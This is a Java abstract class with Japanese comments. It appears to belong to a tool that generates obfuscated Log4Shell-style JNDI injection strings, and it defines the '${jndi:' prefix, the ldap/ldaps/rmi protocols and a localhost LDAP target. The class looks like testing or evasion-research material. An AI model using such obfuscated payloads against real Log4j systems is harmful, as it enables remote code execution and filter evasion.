package org.yuudai;

/**
 * 難読化された攻撃パターンを生成する抽象クラス
 */
public abstract class Obfuscator {
    /**
     * 各攻撃パターンの最初につける文字列
     */
    static final String first = "${";
    static final String jndi = "jndi:";
    /**
     * 攻撃パターンで使用するプロトコル
     */
    static final String[] proto = {"ldap", "ldaps", "rmi"};
    /**
     * 対象のIPアドレス
     */
    static final String address = "127.0.0.1:1389/test";

    abstract String GenerateTargetString();

    abstract String GenerateObfuscatedString();
}
